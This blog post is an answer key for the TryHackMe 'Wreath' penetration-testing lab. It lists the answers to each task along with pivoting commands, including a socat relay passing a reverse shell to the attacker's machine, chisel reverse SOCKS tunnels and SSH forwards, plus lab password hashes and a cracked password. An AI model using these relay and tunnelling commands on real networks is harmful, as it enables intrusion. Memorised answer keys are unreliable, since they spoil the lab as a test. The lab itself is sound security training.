---
title: "THM | Wreath"
date: 2022-01-20
type: "post"
draft: false
showtableOfContents: true
---

## Room

https://tryhackme.com/room/wreath

## Task 1-4: Intro

*No Answer Needed*

## Task 5: Webserver Enumeration 

#### Question 1: How many of the first 15000 ports are open on the target?

*~ 4* 

#### Question 2: What OS does nmap think is running?

*~ CentOS*

#### Question 3: Open the IP in your browser — what site does the sever try to redirect you to?

*~ https://thomaswreath.thm*

#### Question 4: What is Thomas’ mobile phone number?

*~ +447821548812*

#### Question 5: What server version does Nmap detect as running here?

*~ MiniServ 1.890 (Webmin httpd)*

#### Question 6: What is the CVE number for this exploit?

*~ CVE-2019–15107*

## Task 6: Webserver Exploitation

#### Question 1: Which user was the server running as?

*~ root*

#### Question 2: What is the root user’s password hash?

```
$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1
```

#### Question 3:  What is the full path to his file?

*~ /root/.ssh/id_rsa*

## Task 7: Pivoting What is Pivoting?

*No Answer Needed*

## Task 8: Pivoting High Level Overview

#### Question 1: Which type of pivoting creates a channel through which information can be sent hidden inside another protocol?

*~ Tunnelling*

#### Question 2: Which Metasploit Framework Meterpreter command can be used to create a port forward?

*~ portfwd*

## Pivoting Enumeration

#### Question 1: What is the absolute path to the file containing DNS entries on Linux?

*~ /etc/resolv.conf* 

#### Question 2: What is the absolute path to the hosts file on Windows?

*~ C:\Windows\System32\drivers\etc\hosts*

#### Question 3: How could you use which IP addresses re active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?

*~ for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep “bytes from” &); done*

## Task 10: Pivoting Proxychains & Froxypoxy

#### Question 1: What line you put in your proxychains config gile to redirect through a socks4 proxy on 172.0.0.1:4242?

*~ socks4 127.0.0.1 4242*

#### Question 2: What command would you use to telnet through a proxy to 172.16.0.100:23?

*~ proxychains telnet 172.16.0.100 23*

#### Question 3: Which tool is more apt for proxying to a webapp: Proxychains (PC) or FroxyProxy (FP)?

*~ FP*

## Task 11: Pivoting SSH Tunnelling/Port Forwarding

#### Question 1: If you’re connecting to an SSH server from your attacking machine to create a port forward, would this be a local (L) port forward or a emote (R) port forward?

*~ L*

#### Question 2: Which switch combination can be used to background an SSH port forward or tunnel?

*~ fN*

#### Question 3: It’s a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay?

*~ Nay* 

#### Question 4: What command would you use to create a pair of throwaway SSH keys for a reverse connection?

*~ ssh-keygen*

#### Question 5: If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called id_rsa and backgrounding the shell, what command would you use? (Assume your username is "kali")

*~ ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN*

#### Question 6: What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?

*~ ssh -D 8000 user@target.thm -fN*

#### Question 7: If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.

*~ ssh -L 8000:127.0.0.1:80 user@172.16.0.50 -fN*

## Task 12: Pivoting plink.exe

#### Question 1: What tool can be used t convert OpenSSH keys into PuTTY style keys?

*~ puttygen*

## Task 13: Pivoting Socat

#### Question 1: Which socat option allows you to reuse the same listening port for more than one connection?

*~ reuseaddr*

#### Question 2: If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory?

Use TCP port 8000 for the server listener, and do not background the process.

*~ ./socat tcp-l:8000 tcp:172.16.0.200:443*

#### Question 3: What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?

*~ ./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &*

## Task 14: Pivoting Chisel

#### Question 1: What command would you use to start a chisel server for a reverse connection on your attacking machine?

Use port 4242 for the listener and do not background the process.

*~ ./chisel server -p 4242 — reverse*

#### Question 2: What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?

*~ ./chisel client 172.16.0.200:4242 R:socks &*

#### Question 3: How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.

*~ ./chisel client 172.16.0.200:1337 R:33060:172.16.0.100:3306 &*

#### Question 4: If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?

*~ ./chisel client 172.16.0.5:4444 8000:172.16.0.10:80*

## Task 15: Pivoting sshuttle

#### Question 1: How would you use sshuttle to connect to 172.16.20.7, with a username of “pwned” and a subnet of 172.16.0.0/16

*~ sshuttle -r pwned@172.16.20.7 172.16.0.0/16*

#### Question 2: Which switch (and argument) would you use to tell sshuttle to use a keyfile called “priv_key” located in the current directory?

*~ — ssh-cmd “ssh -i priv_key”*

#### Question 3: What switch (and argument) could you use to fix this error?

*~ -x 172.16.0*

## Task 16: Pivoting Conclusion

*No Answer Needed*

## Task 17: Git Server Enumeration

#### Question 1: Excluding the out of scope hosts, and the current host (.200), how many hosts were discovered active on the network?

*~ 2*

#### Question 2: In ascending order, what are the last ocets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submt the 80)

*~ 100, 150*

#### Question 3: Scan the hosts — which one does not return a status of “filtered” for every port (submit the last octet only)?

*~ 150*

#### Question 4: Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?

*~ 80, 3389, 5985*

#### Question 5: Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?

*~ HTTP*

## Task 18: Git server Pivoting

#### Question 1: What is the name of the program running the service?

*~ Gitstack*

#### Question 2: Do these default credentials work (Aye/Nay)?

*~ Nay*

#### Question 3: There is one Python RCE exploit for version 2.3.10 of the service. What is he EDB ID number of this exploit?

*~ 43777*

## Task 19: Git server Code review

#### Question 1: Look at the information at the top of the script. On what date was this exploit written?

*~ 18.01.2018*

#### Question 2: Bearing this in mind, is the script written in python2 or python3?

*~ Python 2*

#### Question 3: Just to confirm that you have been paying attention to the script: What is the name of the cookie set in the POST request made on line 74 (line 73 if you didn’t add the shebang) of the exploit?

*~ csrftoken*

## Task 20: Git server Exploitation

#### Question 1: What is the hostname for this target?

*~ git-serv*

#### Question 2: What operating system is this target?

*~ Windows*

#### Question 3: What user is the server running as?

*~ NT AUTHORITY/SYSTEM*

#### Question 4: How many make it to the waiting listener?

*~ 0*

## Task 21: Git server Stabilisation & Post Exploitation

#### Question 1: What is the Administrator password hash?

*~ 37db630168e5f82aafa8461e05c6bbd1*

#### Question 2: What is the NTLM password hash for he user “Thomas”?

*~ 02d90eda8f6b6b06c32d5f207831101f*

#### Question 3: What is Thomas’ password?

*~ i<3ruby*

## Task 22: Command and Control Introduction

*No Answer Needed*

## Task 23: Empire: Installation

*No Answer Needed*

## Task 24: Empire: Overview

#### Question 1: Can we get an agent back from the git server directly (Aye/Nay)?

*~ Nay*

## Task 25: Empire: Listeners

*No Answer Needed*

## Task 26: Empire: Stagers

*No Answer Needed*

## Task 27: Empire: Agents

#### Question 1: Using the ```help``` command for guidance: in Empire CLI, how would we run the ```whoami``` command inside an agent?

*~ shell whoami*

#### Task 28–32: 

*No Answer Needed*

## Task 33: Personal PC Enumeration

#### Question 1: Scan the top 50 ports of the last IP address you found in Task 17. Which ports are open (lowest to highest, separated by commas)?

*~ 80, 3389*

## Task 34: Personal PC Pivoting

#### Question 1: Using the Wappalyzer browser extension ([Firefox](https://addons.mozilla.org/en-GB/firefox/addon/wappalyzer/) | [Chrome](https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg?hl=en)) or an alternative method, identify the server-side Programming language (including the version number) used on the website.

*~ PHP 7.4.11*

## Task 35: Personal PC The Wonders of git

#### Question 1:Use your WinRM access to look around the Git Server. What is the absolute path to the ```Website.git``` directory?

*~ C:\Gitstack\Repositories\Website.git* 

## Task 36: Personal PC Website Code Analysis

#### Question 1: What does Thomas have to hone Mrs Walker about?

*~ Neighbourhood Watch Meetings*

#### Question 2: Aside from the filter, what protection method is likely to be in place to prevent people from accessing this page?

*~ Basic Auth*

#### Question 3: Which extensions are accepted (comma separated, no spaces or quotes)?

*~ jpg, jpeg, png, gif*

## Task 37: Personal PC Exploit PoC

*No Answer Needed*

## Task 38: AV Evasion Introduction

#### Question 1: Which category of evasion covers uploading a file to the storage on the target before executing it?

*~ On-Disk Evasion*

#### Question 2: What does AMSI stand for?

*~ Anti-malware Scan Interface*

#### Question 3: What category of evasion does AMSI affect?

*~ In-Memry Evasion*

## Task 39: AV Evasion AV Detection Methods

#### Question 1: What other nam can be used for Dynamic/Heuristic detection methods?

*~ Behavioural*

#### Question 2: If AV software splits a program into small chunks and hashes them, checking he results against a database, is this a static or dynamic analysis method?

*~ Static*

#### Question 3: When dynamically analysing a suspicious file using a line-by-line analysis of the program, what would antivirus software check against to see if the behaviour is malicous?

*~ Pre-defined rules*

#### Question 4: What could be added to a file to ensure that only a user can open it (preventing AV from executing the payload)?

*~ Password*

## Task 40: AV Evasion PHP Payload Obfuscation

#### Question 1: What is the Host Name of he target?

*~ WREATH-PC*

#### Question 2: What is our current username (include the domain in this)?

*~ wreath-pc/thomas*

## Task 41: AV Evasion Compiling Netcat & Reverse Shell!

#### Question 1:What output do you get when running the command: ```certutil.exe```?

*~ CertUtil: -dump command completed successfully.*

## Task 42: AV Evasion Enumeration

#### Question 1: [Research] One of the privileges on this list is very famous for being used in the PrintSpoofer and Potato series of privilege escalation exploits — which privilege is this?

*~ SeImpersonatePrivilege*

#### Question 2: What is the Name (second columm from the left) of this service?

*~ SystemExplorerHelpService*

#### Question 3: is the service running as the local system account (Aye/Nay)?

*~ Aye*

## Task 43: AV Evasion Privilege Escalation

*No Answer Needed*

## Task 44: AV Evasion Exfiltration Techniques & Post Exploitation

#### Question 1: Is FTP a good protocol to use when exfiltrating data in a modem network (Aye/Nay)?

*~ Nay*

#### Question 2: For what reason is HTTPS preferred over HTTP during exfiltration?

*~ Encryption*

#### Question 3: What is the administrator NT hash for this target?

*~ a05c3c807ceeb48c47252568da284cd2*

## Task 45–46:

*No Answer Needed*

that's it ✌🏽

-------------------------------------------------------------
{{< rawhtml >}} 
<script src="https://utteranc.es/client.js"
        repo="mansoorbarri/website"
        issue-term="title"
        theme="dark-blue"
        crossorigin="anonymous"
        async>
</script>
{{< /rawhtml >}}

